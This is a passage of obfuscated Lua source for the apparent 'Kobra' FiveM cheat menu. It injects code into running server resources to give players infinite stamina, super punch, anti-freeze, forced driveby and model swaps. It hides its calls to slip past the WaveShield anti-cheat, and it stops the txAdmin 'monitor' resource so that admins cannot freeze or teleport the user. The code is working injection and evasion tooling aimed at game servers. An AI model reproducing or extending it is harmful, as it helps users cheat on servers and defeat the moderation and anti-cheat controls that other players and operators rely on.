                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]]);v12:Notify("success","Kobra","Anti-Freeze Enabled (Fallback)",1288 + 1712 );end elseif v374 then v12:Notify("error","Kobra","Anti-Freeze Disabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            antiFreezeEnabled = false
                                        ]]);else local v774=0 + 0 ;while true do if (v774==(1426 -(85 + 1341))) then v48(v375,[[
                                            antiFreezeEnabled = false
                                        ]]);v12:Notify("error","Kobra","Anti-Freeze Disabled (Fallback)",5119 -2119 );break;end end end end},{type="checkbox",label="Force Third Person",checked=false,desc="This will force third person.",onSelect=function(v376) if v376 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]]);end end},{type="checkbox",label="Force Driveby",checked=false,desc="This will enable driveby if disabled.",onSelect=function(v377) if v377 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]]);end end},{type="checkbox",label="Infinite Stamina",checked=false,desc="This will enable Infinite Stamina.",onSelect=function(v378) if v378 then local v608=0;while true do if (v608==(0 -0)) then v12:Notify("success","Kobra","Infinite Stamina On",3502 -(444 + 58) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]]);end break;end end else v12:Notify("error","Kobra","Infinite Stamina Off",1304 + 1696 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);end end end},{type="checkbox",label="Tiny Ped",checked=false,desc="This will turn you into a tiny ped.",onSelect=function(v379) local v380=((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v379 then v48(v380,[[
                                        if not _G.KobraTinyPedInjected then
                                            _G.KobraTinyPedInjected = true
                                            _G.KobraTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.KobraTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]]);else v48(v380,[[
                                        _G.KobraTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]]);end end},{type="checkbox",label="Super Punch",checked=false,onSelect=function(v381) local v382=GetResourceState("WaveShield")=="started" ;local v383=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v381 then if v382 then local v775=0;while true do if (v775==(0 -0)) then v12:Notify("success","Kobra","Super Punch Enabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]]);break;end end else local v776=0;while true do if (v776==(1732 -(64 + 1668))) then v48(v383,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]]);v12:Notify("success","Kobra","Super Punch Enabled (Fallback)",3000);break;end end end elseif v382 then v12:Notify("error","Kobra","Super Punch Disabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            superPunchEnabled = false
                                        ]]);else local v777=1973 -(1227 + 746) ;while true do if (v777==(0 -0)) then v48(v383,[[
                                            superPunchEnabled = false
                                        ]]);v12:Notify("error","Kobra","Super Punch Disabled (Fallback)",5567 -2567 );break;end end end end},{type="divider",label="txAdmin Options"},{type="checkbox",label="txAdmin Player IDs",checked=false,desc="This will toggle txAdmin Player ids.",onSelect=function(v384) if v384 then MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]]);else MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]]);end end},{type="checkbox",label="txAdmin Noclip",checked=false,desc="This will toggle txAdmin noclip.",onSelect=function(v385) if v385 then if (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","noclip",true);else MachoInjectResource2(3,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]]);end elseif (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","none",true);else MachoInjectResource2(494 -(142 + 349) ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]]);end end},{type="checkbox",label="Disable All txAdmin",checked=false,desc="This will disable txAdmin options from admins using them against you.",onSelect=function(v386) if v386 then local v609=0 + 0 ;while true do if (v609==0) then MachoResourceStop("monitor");print("started");break;end end else local v610=0 -0 ;while true do if (v610==0) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Teleport",checked=false,desc="This will disable txAdmin Teleport.",onSelect=function(v387) if v387 then MachoResourceStop("monitor");print("started");else print("stopped");MachoResourceStart("monitor");end end},{type="checkbox",label="Disable txAdmin Freeze",checked=false,desc="This will disable txAdmin Freeze.",onSelect=function(v388) if v388 then MachoResourceStop("monitor");print("started");else local v611=0 -0 ;while true do if (v611==(1864 -(1710 + 154))) then print("stopped");MachoResourceStart("monitor");break;end end end end}}},{label="Wardrobe",tabs={{icon="",type="scrollable",value=1,values={"Random"},label="Outfit",desc="Apply a preset outfit",onSelect=function(v389) if (v389=="Random") then v48("any",[[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]]);end end},{type="divider",label="Ped Options"},{type="scrollable",label="Freemode",scrollType="onEnter",value=1 + 0 ,values={"Freemode Male","Freemode Female"},onSelect=function(v390) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v390));end},{type="scrollable",label="Peds",scrollType="onEnter",value=1 + 0 ,values={"Michael","Franklin","Trevor","Lamar","Jimmy","Amanda","Tracey","Ron","Wade","Dave Norton","Steve Haines","Devin Weston","Floyd","Chef","Lester","Chop","Brad","Police Officer Male","Police Officer Female","SWAT","Sheriff Male","Sheriff Female","Highway Cop","FIB Male","FIB Female","Paramedic","Firefighter","Doctor","Construction Worker","Pilot Male","Pilot Female","Business Male","Business Female","Street Dealer","Gang Male 1","Gang Male 2","Gang Female 1","Ballas 1","Ballas 2","Ballas Female","Families 1","Families 2","Vagos 1","Vagos 2","Lost MC 1","Lost MC 2","Lost MC Female","Army Soldier","Marine 1","Marine 2","Prisoner Male","Prison Guard","Cop Undercover","Security Guard","Janitor","Hobo Male","Hobo Female","Prostitute 1","Prostitute 2","Beach Male","Beach Female","Tourist Male","Tourist Female","Skater","Hipster Male","Hipster Female","Bouncer","Shopkeeper","Chef","Bartender","Waiter","Mechanic","Taxi Driver","Gardener","Farmer","Dock Worker","Trash Worker","Postal Worker","Bus Driver","Pilot","Air Hostess","Cop Traffic","Cop Detective","Agent","Reporter","News Cameraman","Hunter","Hiker Male","Hiker Female","Golfer Male","Golfer Female","Tennis Player Male","Tennis Player Female"},onSelect=function(v391) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v391));end},{type="scrollable",label="Animal Peds",scrollType="onEnter",value=1074 -(1065 + 8) ,values={"Boar","Cat","Chicken","Chimp","Cow","Coyote","Crow","Deer","Dolphin","Fish","Hen","Humpback","Husky","Killer Whale","Mountain Lion","Pig","Pigeon","Poodle","Pug","Poodle","Rabbit","Rat","Retriever","Rhesus Monkey","Rottweiler","Seagull","Shepherd","Stingray","Tiger Shark","Hammerhead Shark","Cow","Cat2","Chickenhawk","Cormorant","Coyote2","Chimp2","Boar2","Deer2","Fish2","Husky2","Pug2","Poodle2","Retriever2","Shepherd2","Rat2","Rabbit2","Dolphin2","Killer Whale2","Mountain Lion2","Pig2","Seagull2","Stingray2","Tiger Shark2","Hammerhead Shark2"},onSelect=function(v392) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
